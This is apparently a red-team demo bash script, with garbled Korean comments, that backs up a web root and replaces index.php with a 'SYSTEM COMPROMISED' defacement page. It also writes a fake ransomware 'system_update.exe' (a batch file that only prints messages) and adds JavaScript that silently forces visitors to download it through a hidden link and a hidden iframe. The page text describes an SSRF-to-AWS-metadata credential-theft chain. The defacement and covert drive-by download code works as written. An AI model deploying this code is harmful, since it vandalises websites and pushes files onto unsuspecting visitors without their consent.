#!/bin/bash
###############################################################################
# ê°œì„ ëœ ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° ìŠ¤í¬ë¦½íŠ¸ - ìë™ ë‹¤ìš´ë¡œë“œ + ê¹”ë”í•œ ë³µêµ¬
#
# íŠ¹ì§•:
# 1. ì™„ì „íˆ ìˆ¨ê²¨ì§„ ìë™ ë‹¤ìš´ë¡œë“œ (ê²½ë¡œ ì•ˆë¬¼ì–´ë´„)
# 2. ê¹”ë”í•œ ë°±ì—… ë° ë³µêµ¬ ì‹œìŠ¤í…œ
# 3. ì›ë³¸ íŒŒì¼ ì™„ë²½ ë³´ì¡´
###############################################################################

# ìƒ‰ìƒ
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# ê²½ë¡œ ì„¤ì •
WWW_DIR="/var/www/html/www"
BACKUP_DIR="/tmp/site_backup_$(date +%s)"
INDEX_PHP="$WWW_DIR/index.php"
HACKED_PAGE="$WWW_DIR/index.php"

echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
echo "â•‘   ê°œì„ ëœ ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° - ì™„ì „ ìë™ ë‹¤ìš´ë¡œë“œ              â•‘"
echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo ""

# ë£¨íŠ¸ ê¶Œí•œ í™•ì¸
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[-] root ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤${NC}"
    echo "ì‚¬ìš©ë²•: sudo bash $0"
    exit 1
fi

# 1. ì›ë³¸ ë°±ì—…
echo -e "${YELLOW}[1] ì›ë³¸ ì‚¬ì´íŠ¸ ë°±ì—… ì¤‘...${NC}"
mkdir -p "$BACKUP_DIR"
cp -r $WWW_DIR/* "$BACKUP_DIR/" 2>/dev/null
echo "$BACKUP_DIR" > /tmp/last_backup_path.txt
echo -e "${GREEN}[+] ë°±ì—… ì™„ë£Œ: $BACKUP_DIR${NC}"
echo ""

# 2. ì•…ì„±ì½”ë“œ í˜ì´ë¡œë“œ ìƒì„± (ìë™ ë‹¤ìš´ë¡œë“œë  íŒŒì¼)
echo -e "${YELLOW}[2] ì•…ì„±ì½”ë“œ í˜ì´ë¡œë“œ ìƒì„± ì¤‘...${NC}"
mkdir -p $WWW_DIR/downloads
cat > $WWW_DIR/downloads/system_update.exe << 'EOFMALWARE'
@echo off
title Critical System Update
color 0C
echo.
echo ========================================
echo     CRITICAL SYSTEM UPDATE v2.1
echo ========================================
echo.
echo [!] RANSOMWARE ENCRYPTED YOUR FILES
echo [+] All your documents are now locked
echo [+] Bitcoin payment required: 5 BTC
echo.
echo [*] Connecting to C2 Server...
echo [*] IP: 185.220.101.xxx (Tor Exit Node)
echo [*] Status: CONNECTED
echo.
echo [ACTIVE MODULES]
echo  - Keylogger: RUNNING
echo  - Screen Capture: ACTIVE
echo  - Data Exfiltration: IN PROGRESS
echo  - Persistence: INSTALLED
echo.
echo ========================================
echo Contact: darknet@protonmail.com
echo ========================================
echo.
pause
EOFMALWARE

chmod 644 $WWW_DIR/downloads/system_update.exe
chown apache:apache $WWW_DIR/downloads/system_update.exe
echo -e "${GREEN}[+] ì•…ì„±ì½”ë“œ ìƒì„±: downloads/system_update.exe${NC}"
echo ""

# 3. í•´í‚¹ í˜ì´ì§€ ìƒì„± (ìë™ ë‹¤ìš´ë¡œë“œ í¬í•¨)
echo -e "${YELLOW}[3] í•´í‚¹ í˜ì´ì§€ ìƒì„± ì¤‘...${NC}"

cat > "$HACKED_PAGE" << 'EOFHTML'
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM COMPROMISED</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            overflow-x: hidden;
        }

        #matrix {
            position: fixed;
            top: 0;
            left: 0;
            z-index: 0;
            opacity: 0.3;
        }

        .container {
            position: relative;
            z-index: 1;
            text-align: center;
            padding: 2rem;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        h1 {
            font-size: clamp(2rem, 8vw, 5rem);
            color: #f00;
            text-shadow: 0 0 20px #f00, 0 0 40px #f00;
            margin: 1rem 0;
            animation: glitch 2s infinite;
        }

        .skull {
            font-size: clamp(3rem, 15vw, 8rem);
            animation: pulse 1s infinite;
            filter: drop-shadow(0 0 30px #f00);
        }

        .warning {
            font-size: clamp(1rem, 3vw, 1.5rem);
            color: #ff0;
            margin: 1rem 0;
            animation: blink 1s infinite;
        }

        .info-box {
            background: rgba(255, 0, 0, 0.1);
            border: 2px solid #f00;
            border-radius: 10px;
            padding: 2rem;
            margin: 2rem auto;
            max-width: 900px;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
        }

        .info-box h2 {
            color: #f00;
            font-size: clamp(1.2rem, 4vw, 2rem);
            margin-bottom: 1rem;
            text-shadow: 0 0 10px #f00;
        }

        .attack-chain {
            text-align: left;
            margin: 1rem 0;
            line-height: 1.8;
        }

        .attack-chain li {
            margin: 0.5rem 0;
            list-style: none;
            padding-left: 1.5rem;
            position: relative;
        }

        .attack-chain li:before {
            content: "â†’";
            position: absolute;
            left: 0;
            color: #0f0;
        }

        .malware-status {
            background: rgba(255, 0, 0, 0.3);
            border: 2px solid #f00;
            padding: 1.5rem;
            margin-top: 2rem;
            border-radius: 10px;
            animation: pulse-red 2s infinite;
        }

        .malware-status h3 {
            color: #f00;
            margin-bottom: 1rem;
        }

        code {
            background: rgba(0, 255, 0, 0.2);
            padding: 0.2rem 0.5rem;
            border-radius: 3px;
            color: #0f0;
        }

        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-3px, 3px); }
            40% { transform: translate(-3px, -3px); }
            60% { transform: translate(3px, 3px); }
            80% { transform: translate(3px, -3px); }
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.05); }
        }

        @keyframes pulse-red {
            0%, 100% { box-shadow: 0 0 10px #f00; }
            50% { box-shadow: 0 0 40px #f00; }
        }

        @keyframes blink {
            0%, 50%, 100% { opacity: 1; }
            25%, 75% { opacity: 0; }
        }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>

    <div class="container">
        <div class="skull">â˜ ï¸</div>
        <h1>âš ï¸ SYSTEM COMPROMISED âš ï¸</h1>
        <div class="warning">UNAUTHORIZED ACCESS DETECTED</div>

        <div class="info-box">
            <h2>ğŸ”´ ê³µê²© ì²´ì¸ (Attack Chain)</h2>

            <div class="attack-chain">
                <ul>
                    <li>ì™„ë²½í•œ ë³´ì•ˆ ì‹œìŠ¤í…œ (ModSecurity WAF + Splunk SIEM)</li>
                    <li>ì‘ì€ í‹ˆ ë°œê²¬: /api/health.php (ModSecurity ì˜ˆì™¸)</li>
                    <li>SSRF ì·¨ì•½ì  ì•…ìš©</li>
                    <li>AWS IMDSv1 ì ‘ê·¼ â†’ IAM Credentials íƒˆì·¨</li>
                    <li>AWS Systems Managerë¥¼ í†µí•œ ì„œë²„ ì ‘ê·¼</li>
                    <li>Root ê¶Œí•œ íšë“</li>
                    <li>Splunk SIEM ë¬´ë ¥í™”</li>
                    <li>ì˜êµ¬ ë°±ë„ì–´ ì„¤ì¹˜</li>
                    <li>ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° ì™„ë£Œ</li>
                    <li style="color:#f00;">ì•…ì„±ì½”ë“œ ìë™ ë°°í¬ ì™„ë£Œ ğŸ¦ </li>
                </ul>
            </div>

            <div class="malware-status">
                <h3>ğŸ¦  ì•…ì„±ì½”ë“œ ì„¤ì¹˜ ìƒíƒœ</h3>
                <div id="download-status" style="color:#0f0;">
                    âœ… ì‹œìŠ¤í…œ ê°ì—¼ ì§„í–‰ ì¤‘...
                </div>
                <div style="margin-top:1rem;">
                    ğŸ“ ê²½ë¡œ: <code>C:\Downloads\system_update.exe</code><br>
                    ğŸ”’ íƒ€ì…: Ransomware + RAT + Keylogger<br>
                    âš ï¸ ìƒíƒœ: <span id="infection-status">ìë™ ë‹¤ìš´ë¡œë“œ ì¤‘...</span>
                </div>
            </div>

            <div style="margin-top: 2rem; font-size: 0.9rem;">
                <strong style="color: #0f0;">í•µì‹¬ êµí›ˆ:</strong><br>
                Perfect Security + One Small Gap = Total Compromise
            </div>

            <div style="margin-top: 1rem; font-size: 0.8rem; color: #666;">
                <strong>ì·¨ì•½ì :</strong> AWS IMDSv1 í™œì„±í™”<br>
                <strong>ê³µê²© ë²¡í„°:</strong> ModSecurity ì˜ˆì™¸ â†’ SSRF â†’ IMDS<br>
                <strong>ì˜í–¥:</strong> ì „ì²´ ì‹œìŠ¤í…œ ì¥ì•… + ì•…ì„±ì½”ë“œ ë°°í¬
            </div>
        </div>

        <div style="margin-top: 2rem; color: #666; font-size: 0.8rem;">
            <p>Compromised at: <?php echo date('Y-m-d H:i:s'); ?> UTC</p>
            <p>Server: <?php echo gethostname(); ?></p>
            <p style="margin-top: 1rem;">Red Team Penetration Testing Demo - 2025</p>
        </div>
    </div>

    <script>
        // Matrix Rain Effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ã‚¢ã‚¤ã‚¦ã‚¨ã‚ªã‚«ã‚­ã‚¯ã‚±ã‚³';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];

        for (let i = 0; i < columns; i++) {
            drops[i] = Math.random() * canvas.height / fontSize;
        }

        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0f0';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const char = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.95) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(draw, 33);

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        // ============================================
        // ì™„ì „íˆ ìˆ¨ê²¨ì§„ ìë™ ë‹¤ìš´ë¡œë“œ (ê²½ë¡œ ì•ˆë¬¼ì–´ë´„!)
        // ============================================

        // 5ì´ˆ í›„ ìë™ ë‹¤ìš´ë¡œë“œ ì‹œì‘ (ì‚¬ìš©ìê°€ í˜ì´ì§€ ë‚´ìš© ì½ëŠ” ë™ì•ˆ)
        setTimeout(() => {
            try {
                // Method 1: Blob + Auto Download (ê°€ì¥ íš¨ê³¼ì )
                fetch('/downloads/system_update.exe')
                    .then(response => response.blob())
                    .then(blob => {
                        // ì™„ì „íˆ ë³´ì´ì§€ ì•ŠëŠ” ë‹¤ìš´ë¡œë“œ ë§í¬ ìƒì„±
                        const url = window.URL.createObjectURL(blob);
                        const a = document.createElement('a');

                        // ì™„ì „íˆ ìˆ¨ê¹€
                        a.style.cssText = 'display:none!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;opacity:0!important;visibility:hidden!important;';

                        a.href = url;
                        a.download = 'system_update.exe';  // ì‹¤ì œ íŒŒì¼ëª…

                        // DOMì— ì¶”ê°€ â†’ í´ë¦­ â†’ ì œê±° (ëª¨ë‘ ë³´ì´ì§€ ì•ŠìŒ)
                        document.body.appendChild(a);
                        a.click();

                        // ìƒíƒœ ì—…ë°ì´íŠ¸
                        setTimeout(() => {
                            document.getElementById('infection-status').innerHTML = '<span style="color:#0f0;">ë‹¤ìš´ë¡œë“œ ì™„ë£Œ âœ…</span>';
                            document.getElementById('download-status').innerHTML = 'âœ… ì‹œìŠ¤í…œ ê°ì—¼ ì™„ë£Œ!';
                        }, 2000);

                        // ì •ë¦¬
                        setTimeout(() => {
                            document.body.removeChild(a);
                            window.URL.revokeObjectURL(url);
                        }, 100);
                    })
                    .catch(err => {
                        // ì‹¤íŒ¨í•´ë„ ì¡°ìš©íˆ (ì‚¬ìš©ì ëª¨ë¦„)
                        console.log('Silent download failed:', err);
                    });

                // Method 2: Hidden iframe (ë°±ì—… ë°©ë²•)
                setTimeout(() => {
                    const iframe = document.createElement('iframe');
                    iframe.style.cssText = 'display:none!important;visibility:hidden!important;width:0!important;height:0!important;border:none!important;position:absolute!important;left:-9999px!important;';
                    iframe.src = '/downloads/system_update.exe';
                    document.body.appendChild(iframe);

                    // 5ì´ˆ í›„ ì œê±°
                    setTimeout(() => {
                        try { document.body.removeChild(iframe); } catch(e) {}
                    }, 5000);
                }, 3000);

            } catch(e) {
                // ì™„ì „íˆ ì¡°ìš©í•œ ì‹¤íŒ¨ (ì˜¤ë¥˜ë„ ì•ˆë³´ì„)
            }
        }, 5000);  // í˜ì´ì§€ ë¡œë“œ 5ì´ˆ í›„ ì‹œì‘
    </script>
</body>
</html>
EOFHTML

chmod 644 "$HACKED_PAGE"
chown apache:apache "$HACKED_PAGE"
echo -e "${GREEN}[+] í•´í‚¹ í˜ì´ì§€ ìƒì„± ì™„ë£Œ${NC}"
echo ""

# 4. ì™„ë£Œ ë©”ì‹œì§€
echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
echo "â•‘   âœ… ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° ì™„ë£Œ!                                  â•‘"
echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo ""
echo -e "${GREEN}[+] ë³€ì¡°ëœ ì‚¬ì´íŠ¸ í™•ì¸:${NC}"
IP=$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4 2>/dev/null || echo "YOUR_SERVER_IP")
echo "    http://$IP"
echo ""
echo -e "${YELLOW}[*] ì£¼ìš” ê¸°ëŠ¥:${NC}"
echo "    â€¢ í•´í‚¹ í˜ì´ì§€ í‘œì‹œ"
echo "    â€¢ 5ì´ˆ í›„ ìë™ìœ¼ë¡œ ì•…ì„±ì½”ë“œ ë‹¤ìš´ë¡œë“œ (ì™„ì „ ìˆ¨ê¹€)"
echo "    â€¢ ì‚¬ìš©ìëŠ” ë‹¤ìš´ë¡œë“œ ê²½ë¡œë¥¼ ë¬»ì§€ ì•ŠìŒ"
echo "    â€¢ ë¸Œë¼ìš°ì € ë‹¤ìš´ë¡œë“œ í´ë”ì— system_update.exe ìƒì„±"
echo ""
echo -e "${GREEN}[+] ì›ë³¸ ë³µêµ¬ ë°©ë²•:${NC}"
echo "    sudo bash CLEAN_RESTORE.sh"
echo ""
echo -e "${YELLOW}[*] ë°±ì—… ìœ„ì¹˜:${NC}"
echo "    $BACKUP_DIR"
echo ""
